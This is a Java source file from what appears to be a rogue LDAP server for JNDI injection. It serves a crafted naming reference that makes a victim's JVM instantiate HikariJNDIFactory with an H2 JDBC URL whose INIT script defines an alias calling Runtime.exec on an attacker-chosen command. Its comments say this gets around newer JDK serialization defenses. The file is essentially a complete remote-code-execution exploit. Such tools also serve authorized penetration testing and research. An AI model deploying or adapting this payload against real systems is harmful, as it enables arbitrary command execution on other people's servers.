package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

/**
 * RCE by controlling the JDBC URL (connection string) of HikariJNDIFactory.
 * This version uses a Reference with the factory class name directly in the LDAP entry
 * rather than serialized data which is blocked by default in recent JDK versions.

 * Uses the same H2 SQL injection technique as HikariCPH2 but works with
 * newer JDK versions where com.sun.jndi.ldap.object.trustSerialData=false

 * Requires:
 *  HikariCP and H2 in classpath

 * Verified On:
 *  - com.zaxxer:HikariCP:4.0.3
 *  - com.h2database:h2:2.1.214
 */

@LdapMapping(uri = {"/o=hikaricp-h2-local-factory"})
public class HikariCPH2LocalFactory implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP Reference result for " + base + " with hikaricp-h2-ref payload");

        Entry e = new Entry(base);

        // Set the object class to create a Reference
        e.addAttribute("objectClass", "javaNamingReference");

        // Set the Java class name to load
        e.addAttribute("javaClassName", "javax.sql.DataSource");

        // Specify the factory class directly
        e.addAttribute("javaFactory", "com.zaxxer.hikari.HikariJNDIFactory");

        // The H2 JDBC URL with embedded code execution
        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS " +
                "'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;" +
                "return \"test\"\\;}'\\;CALL EXEC('" + Config.command + "')";

        System.out.println("[DEBUG] Created JDBC URL: " + url);

        // Format should be exactly: "#[index]#[type]#[content]"
        // This matches what Java's LDAP reference parser expects
        e.addAttribute("javaReferenceAddress", "#0#jdbcUrl#" + url);
        e.addAttribute("javaReferenceAddress", "#1#driverClassName#org.h2.Driver");
        e.addAttribute("javaReferenceAddress", "#2#username#root");
        e.addAttribute("javaReferenceAddress", "#3#password#password");
        e.addAttribute("javaReferenceAddress", "#4#autoCommit#true");
        e.addAttribute("javaReferenceAddress", "#5#maximumPoolSize#1");

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
